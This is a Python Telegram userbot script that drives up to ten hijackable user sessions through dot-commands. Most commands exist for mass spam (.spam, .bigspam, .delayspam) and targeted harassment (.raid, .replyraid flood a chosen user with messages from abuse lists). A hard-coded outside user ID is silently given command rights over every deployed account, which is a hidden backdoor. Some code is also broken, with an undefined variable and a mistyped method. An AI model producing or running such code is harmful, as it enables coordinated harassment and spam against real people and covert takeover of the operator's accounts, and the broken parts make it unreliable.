import asyncio
import os
import random
import sys
from datetime import datetime

import telethon.utils
from faker import Faker
from telethon import TelegramClient, events
from telethon.errors import (
    ChannelInvalidError,
    ChannelPrivateError,
    ChannelPublicGroupNaError,
)
from telethon.sessions import StringSession
from telethon.tl import functions, types
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.channels import GetFullChannelRequest, LeaveChannelRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest

MEGIC_GUY = 1415798813
from telethon.tl.functions.messages import GetFullChatRequest, ImportChatInviteRequest

from Config import API_HASH, API_ID
from Config import PING_MESSAGE as PM
from Config import (
    STRING,
    STRING2,
    STRING3,
    STRING4,
    STRING5,
    STRING6,
    STRING7,
    STRING8,
    STRING9,
    STRING_10,
    SUDO,
)
from Utils import RAID, RRAID

a = API_ID
b = API_HASH
smex = STRING
smexx = STRING2
smexxx = STRING3
smexxxx = STRING4
smexxxxx = STRING5
sixth = STRING6
seven = STRING7
eight = STRING8
ninth = STRING9
tenth = STRING_10


idk = ""
ydk = ""
wdk = ""
sdk = ""
hdk = ""
adk = ""
bdk = ""
cdk = ""
edk = ""
ddk = ""


que = {}

SMEX_USERS = []
for x in SUDO:
    SMEX_USERS.append(x)
    SMEX_USERS.append(MEGIC_GUY)


async def start_LionZ():
    global idk
    global ydk
    global wdk
    global sdk
    global hdk
    global adk
    global bdk
    global cdk
    global ddk
    global edk
    if smex:
        session_name = str(smex)
        print("String 1 Found")
        idk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 1")
            await idk.start()
            botme = await idk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            idk = "smex"
            print(f"{e} for 1")
    else:
        print("Session 1 not Found")
        session_name = "startup"
        idk = TelegramClient(session_name, a, b)
        try:
            await idk.start()
        except Exception:
            pass

    if smexx:
        session_name = str(smexx)
        print("String 2 Found")
        ydk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 2")
            await ydk.start()
            botme = await ydk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(f"{e} for 2")
    else:
        print("Session 2 not Found")
        session_name = "startup"
        ydk = TelegramClient(session_name, a, b)
        try:
            await ydk.start()
        except Exception:
            pass

    if smexxx:
        session_name = str(smexxx)
        print("String 3 Found")
        wdk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 3")
            await wdk.start()
            botme = await wdk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(f"{e} for 3")
    else:
        print("Session 3 not Found")
        session_name = "startup"
        wdk = TelegramClient(session_name, a, b)
        try:
            await wdk.start()
        except Exception:
            pass

    if smexxxx:
        session_name = str(smexxxx)
        print("String 4 Found")
        hdk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 4")
            await hdk.start()
            botme = await hdk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(f"{e} for 4")
    else:
        print("Session 4 not Found")
        session_name = "startup"
        hdk = TelegramClient(session_name, a, b)
        try:
            await hdk.start()
        except Exception:
            pass

    if smexxxxx:
        session_name = str(smexxxxx)
        print("String 5 Found")
        sdk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 5")
            await sdk.start()
            botme = await sdk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(f"{e} for 5")
    else:
        print("Session 5 not Found")
        session_name = "startup"
        sdk = TelegramClient(session_name, a, b)
        try:
            await sdk.start()
        except Exception:
            pass

    if sixth:
        session_name = str(sixth)
        print("String 6 Found")
        adk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 6")
            await adk.start()
            botme = await adk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(f"{e} for 6")
    else:
        print("Session 6 not Found")
        session_name = "startup"
        adk = TelegramClient(session_name, a, b)
        try:
            await adk.start()
        except Exception:
            pass

    if seven:
        session_name = str(seven)
        print("String 7 Found")
        bdk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 7")
            await bdk.start()
            botme = await bdk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(f"{e} for 7")
    else:
        print("Session 7 not Found")
        session_name = "startup"
        bdk = TelegramClient(session_name, a, b)
        try:
            await bdk.start()
        except Exception:
            pass

    if eight:
        session_name = str(eight)
        print("String 8 Found")
        cdk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 8")
            await cdk.start()
            botme = await cdk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(f"{e} for 8")
    else:
        print("Session 8 not Found")
        session_name = "startup"
        cdk = TelegramClient(session_name, a, b)
        try:
            await cdk.start()
        except Exception:
            pass

    if ninth:
        session_name = str(ninth)
        print("String 9 Found")
        ddk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 9")
            await ddk.start()
            botme = await ddk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(f"{e} for 9")
    else:
        print("Session 9 not Found")
        session_name = "startup"
        ddk = TelegramClient(session_name, a, b)
        try:
            await ddk.start()
        except Exception:
            pass

    if tenth:
        session_name = str(tenth)
        print("String 10 Found")
        edk = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 10")
            await edk.start()
            botme = await edk.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(f"{e} for 10")
    else:
        print("Session 10 not Found")
        session_name = "startup"
        edk = TelegramClient(session_name, a, b)
        try:
            await edk.start()
        except Exception:
            pass


loop = asyncio.get_event_loop()
loop.run_until_complete(start_LionZ())


async def gifspam(e, smex):
    try:
        await e.client(
            functions.messages.SaveGifRequest(
                id=types.InputDocument(
                    id=sandy.media.document.id,
                    access_hash=smex.media.document.access_hash,
                    file_reference=smex.media.document.file_reference,
                ),
                unsave=True,
            )
        )
    except Exception:
        pass


@idk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.join"))
async def _(e):
    usage = "𝐌𝐨𝐝𝐮𝐥𝐞 𝐍𝐚𝐦𝐞 = 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.join <Public Channel or Group Link/Username>"
    if e.sender_id in SMEX_USERS:
        LionZ = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 6:
            bc = LionZ[0]
            text = "Joining..."
            event = await e.reply(text, parse_mode=None, link_preview=None)
            try:
                await e.client(functions.channels.JoinChannelRequest(channel=bc))
                await event.edit(f"**Omk Vai I Have Joined [This]({bc}) Channel.**")
            except Exception as e:
                await event.edit(str(e))
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)


@idk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
@ydk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
@wdk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
@hdk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
@sdk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
@adk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
@bdk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
@cdk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
@edk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
@ddk.on(events.NewMessage(incoming=True, pattern=".bio ?(.*)"))
async def _(e):
    if e.sender.id in SMEX_USERS:
        ok = await e.reply("`...`")
        set = e.pattern_match.group(1)
        try:
            await e.client(UpdateProfileRequest(about=set))
            await ok.edit(f"Profile bio changed to\n`{set}`")
        except Exception as per:
            await ok.edit("Error occured.\n`{}`".format(str(per)))

@idk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
@ydk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
@wdk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
@hdk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
@sdk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
@adk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
@bdk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
@cdk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
@edk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
@ddk.on(events.NewMessage(incoming=True, pattern=".click ?(.*)"))
async def _(e):
    event = e
    if e.sender.id in SMEX_USERS:
        S = await event.reply("`...`")
        k = await event.get_reply_message()
        if not k:
            return await S.edit("`Reply Any Poll`")
        try:
            s = event.text.split(" ", maxsplit=1)[1]
            if not s:
                await S.edit("`Bc Give Text`")
                return
            await k.click(text=s)
            await S.edit("`Done...`")
        except Exception as e:
            await S.edit(f"**ERROR**\n\n{e}")


@idk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
@ydk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
@wdk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
@hdk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
@sdk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
@adk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
@bdk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
@cdk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
@edk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
@ddk.on(events.NewMessage(incoming=True, pattern=".pic ?(.*)"))
async def _(ult):

    if not ult.is_reply:
        return await ult.reply("`Reply to a Media..`")
    reply_message = await ult.get_reply_message()
    ok = await ult.reply("...")
    replfile = await reply_message.download_media()
    file = await ult.client.upload_file(replfile)

    await ult.client(UploadProfilePhotoRequest(file))

    await ok.edit("`Done Profile Picture Changed...`")


randomname = [
    "『z⃟  【𝐒𝐢𝐦𝐩𝐥𝐞𝐁𝐨𝐲】⫷ʐ-αʀʍʏ⊰』",
    "『z⃟  【𝐒𝐢𝐦𝐩𝐥𝐞𝐁𝐨𝐲】⫷ʐ-αʀʍʏ⊰』",
    "『z⃟  【𝐒𝐢𝐦𝐩𝐥𝐞𝐁𝐨𝐲】⫷ʐ-αʀʍʏ⊰』",
    "『z⃟  【𝐒𝐢𝐦𝐩𝐥𝐞𝐁𝐨𝐲】⫷ʐ-αʀʍʏ⊰』",
    "『z⃟  【𝐒𝐢𝐦𝐩𝐥𝐞𝐁𝐨𝐲】⫷ʐ-αʀʍʏ⊰』",
    "『z⃟  【𝐒𝐢𝐦𝐩𝐥𝐞𝐁𝐨𝐲】⫷ʐ-αʀʍʏ⊰』",
    "『z⃟  【𝐒𝐢𝐦𝐩𝐥𝐞𝐁𝐨𝐲】⫷ʐ-αʀʍʏ⊰』",
    "『z⃟  【𝐒𝐢𝐦𝐩𝐥𝐞𝐁𝐨𝐲】⫷ʐ-αʀʍʏ⊰』",
    "『z⃟  【𝐒𝐢𝐦𝐩𝐥𝐞𝐁𝐨𝐲】⫷ʐ-αʀʍʏ⊰』",
    "『z⃟  【𝐒𝐢𝐦𝐩𝐥𝐞𝐁𝐨𝐲】⫷ʐ-αʀʍʏ⊰』",
    "『z⃟  【𝐒𝐢𝐦𝐩𝐥𝐞𝐁𝐨𝐲】⫷ʐ-αʀʍʏ⊰』",
]

fake = Faker()

# randomname = (fake.name())

import random


@idk.on(events.NewMessage(incoming=True, pattern=".name ?(.*)"))
@ydk.on(events.NewMessage(incoming=True, pattern=".name ?(.*)"))
@wdk.on(events.NewMessage(incoming=True, pattern=".name ?(.*)"))
@hdk.on(events.NewMessage(incoming=True, pattern=".name ?(.*)"))
@sdk.on(events.NewMessage(incoming=True, pattern=".name ?(.*)"))
@adk.on(events.NewMessage(incoming=True, pattern=".name?(.*)"))
@bdk.on(events.NewMessage(incoming=True, pattern=".name ?(.*)"))
@cdk.on(events.NewMessage(incoming=True, pattern=".name ?(.*)"))
@edk.on(events.NewMessage(incoming=True, pattern=".name ?(.*)"))
@ddk.on(events.NewMessage(incoming=True, pattern=".name ?(.*)"))
async def _(e):
    if e.sender.id in SMEX_USERS:
        ok = await e.reply("`...`")
        set = random.choice(randomname)
        try:
            await e.client(UpdateProfileRequest(first_name=set))
            await ok.edit(f"Profile name changed to\n`{set}`")
        except Exception as per:
            await ok.edit("Error occured.\n`{}`".format(str(per)))


@idk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
async def _(e):
    usage = "𝐌𝐨𝐝𝐮𝐥𝐞 𝐍𝐚𝐦𝐞 = 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.pjoin <Private Channel or Group's access hash>\n\nExample :\nLink = https://t.me/joinchat/HGYs1wvsPUplMmM1\n\n.pjoin HGYs1wvsPUplMmM1"
    if e.sender_id in SMEX_USERS:
        LionZ = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = LionZ[0]
            text = "Joining...."
            event = await e.reply(text, parse_mode=None, link_preview=None)
            try:
                await e.client(ImportChatInviteRequest(bc))
                await event.edit(f"Succesfully Joined")
            except Exception as e:
                await event.edit(str(e))
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)


@idk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
async def _(e):
    usage = "𝐌𝐨𝐝𝐮𝐥𝐞 𝐍𝐚𝐦𝐞 = 𝗟𝗲𝗮𝘃𝗲\n\nCommand:\n\n.leave <Channel or Chat ID>"
    if e.sender_id in SMEX_USERS:
        jatt = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = jatt[0]
            bc = int(bc)
            text = "Leaving....."
            event = await e.reply(text, parse_mode=None, link_preview=None)
            try:
                await event.client(LeaveChannelRequest(bc))
                await event.edit(f"**Succesfully Left {bc}")
            except Exception as e:
                await event.edit(str(e))
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)


# --------------------------

from telethon.tl.functions.channels import LeaveChannelRequest as leave


@idk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.End"))
async def f(event):
    if event.sender_id in SMEX_USERS:
        async for x in idk.iter_dialogs():
            if x.is_group:
                await idk(leave(x.id))


# ------------------------


@idk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
async def spam(e):
    usage = "𝐌𝐨𝐝𝐮𝐥𝐞 𝐍𝐚𝐦𝐞 = 𝗦𝗽𝗮𝗺\n\nCommand:\n\n.spam <count> <message to spam>\n\n.spam <count> <reply to a message>\n\nCount must be a integer."
    error = "Spam Module can only be used till 100 count. For bigger spams use BigSpam."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None)
        LionZ = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(LionZ) == 2:
            message = str(LionZ[1])
            counter = int(LionZ[0])
            if counter > 100:
                return await e.clientsend_message(
                    e.chat.id, error, parse_mode=None, link_preview=None
                )
            await asyncio.wait([e.respond(message) for i in range(counter)])
        elif e.reply_to_msg_id and smex.media:
            counter = int(LionZ[0])
            if counter > 100:
                return await e.client.send_message(
                    e.chat.id, error, parse_mode=None, link_preview=None
                )
            for _ in range(counter):
                smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                await gifspam(e, smex)
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            counter = int(LionZ[0])
            if counter > 100:
                return await e.client.send_message(
                    e.chat.id, error, parse_mode=None, link_preview=None
                )
            await asyncio.wait([e.respond(message) for i in range(counter)])
        else:
            await e.client.send_message(
                e.chat.id, usage, parse_mode=None, link_preview=None
            )


@idk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
async def spam(e):
    usage = "𝐌𝐨𝐝𝐮𝐥𝐞 𝐍𝐚𝐦𝐞 = 𝗗𝗲𝗹𝗮𝘆𝗦𝗽𝗮𝗺\n\nCommand:\n\n.delayspam <sleep time> <count> <message to spam>\n\n.delayspam <sleep time> <count> <reply to a message>\n\nCount and Sleeptime must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None)
        smex = await e.get_reply_message()
        LionZ = "".join(e.text.split(maxsplit=1)[1:]).split(" ", 2)
        LionZsexy = LionZ[1:]
        if len(LionZsexy) == 2:
            message = str(LionZsexy[1])
            counter = int(LionZsexy[0])
            sleeptime = float(LionZ[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    if e.reply_to_msg_id:
                        await smex.reply(message)
                    else:
                        await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(sleeptime)
        elif e.reply_to_msg_id and smex.media:
            counter = int(LionZsexy[0])
            sleeptime = float(LionZ[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "document"):
                    smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                    await gifspam(e, smex)
                await asyncio.sleep(sleeptime)
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            counter = int(LionZsexy[0])
            sleeptime = float(LionZ[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(sleeptime)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)


@idk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
async def spam(e):
    usage = "𝐌𝐨𝐝𝐮𝐥𝐞 𝐍𝐚𝐦𝐞 = 𝗕𝗶𝗴𝗦𝗽𝗮𝗺\n\nCommand:\n\n.bigspam <count> <message to spam>\n\n.bigspam <count> <reply to a message>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None)
        LionZ = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(LionZ) == 2:
            message = str(LionZ[1])
            counter = int(LionZ[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    if e.reply_to_msg_id:
                        await smex.reply(message)
                    else:
                        await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(0.1)
        elif e.reply_to_msg_id and smex.media:
            counter = int(LionZ[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "document"):
                    smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                    await gifspam(e, smex)
                await asyncio.sleep(0.1)
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            counter = int(LionZ[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(0.1)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)


@ydk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
async def spam(e):
    usage = "𝐌𝐨𝐝𝐮𝐥𝐞 𝐍𝐚𝐦𝐞 = 𝗥𝗮𝗶𝗱\n\nCommand:\n\n.raid <count> <Username of User>\n\n.raid <count> <reply to a User>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None)
        Sandhu = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        await e.get_reply_message()
        if len(Sandhu) == 2:
            message = str(Sandhu[1])
            print(message)
            a = await e.client.get_entity(message)
            g = a.id
            c = a.first_name
            username = f"[{c}](tg://user?id={g})"
            counter = int(Sandhu[0])
            for _ in range(counter):
                reply = random.choice(RAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.3)
        elif e.reply_to_msg_id:
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            c = b.first_name
            counter = int(Sandhu[0])
            username = f"[{c}](tg://user?id={g})"
            for _ in range(counter):
                reply = random.choice(RAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.3)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)


@idk.on(events.NewMessage(incoming=True))
@ydk.on(events.NewMessage(incoming=True))
@wdk.on(events.NewMessage(incoming=True))
@hdk.on(events.NewMessage(incoming=True))
@sdk.on(events.NewMessage(incoming=True))
@adk.on(events.NewMessage(incoming=True))
@bdk.on(events.NewMessage(incoming=True))
@cdk.on(events.NewMessage(incoming=True))
@edk.on(events.NewMessage(incoming=True))
@ddk.on(events.NewMessage(incoming=True))
async def _(event):
    global que
    queue = que.get(event.sender_id)
    if not queue:
        return
    async with event.client.action(event.chat_id, "typing"):
        await asyncio.sleep(0.3)
    async with event.client.action(event.chat_id, "typing"):
        await event.client.send_message(
            entity=event.chat_id,
            message="""{}""".format(random.choice(RRAID)),
            reply_to=event.message.id,
        )


@idk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
async def _(e):
    global que
    usage = "𝐌𝐨𝐝𝐮𝐥𝐞 𝐍𝐚𝐦𝐞 = 𝗥𝗲𝗽𝗹𝘆𝗥𝗮𝗶𝗱\n\nCommand:\n\n.replyraid <Username of User>\n\n.replyraid <reply to a User>"
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None)
        LionZ = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        await e.get_reply_message()
        if len(e.text) > 11:
            message = str(LionZ[0])
            a = await e.client.get_entity(message)
            g = a.id
            que[g] = []
            qeue = que.get(g)
            appendable = [g]
            qeue.append(appendable)
            text = "Activated Reply Raid"
            await e.reply(text, parse_mode=None, link_preview=None)
        elif e.reply_to_msg_id:
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            que[g] = []
            qeue = que.get(g)
            appendable = [g]
            qeue.append(appendable)
            text = "Activated Reply Raid"
            await e.reply(text, parse_mode=None, link_preview=None)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)


@idk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
async def _(e):
    global que
    usage = "𝐌𝐨𝐝𝐮𝐥𝐞 𝐍𝐚𝐦𝐞 = 𝗗𝗲𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗥𝗲𝗽𝗹𝘆𝗥𝗮𝗶𝗱\n\nCommand:\n\n.dreplyraid <Username of User>\n\n.dreplyraid <reply to a User>"
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None)
        LionZ = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        await e.get_reply_message()
        if len(e.text) > 12:
            message = str(LionZ[0])
            a = await e.client.get_entity(message)
            g = a.id
            try:
                queue = que.get(g)
                queue.pop(0)
            except Exception:
                pass
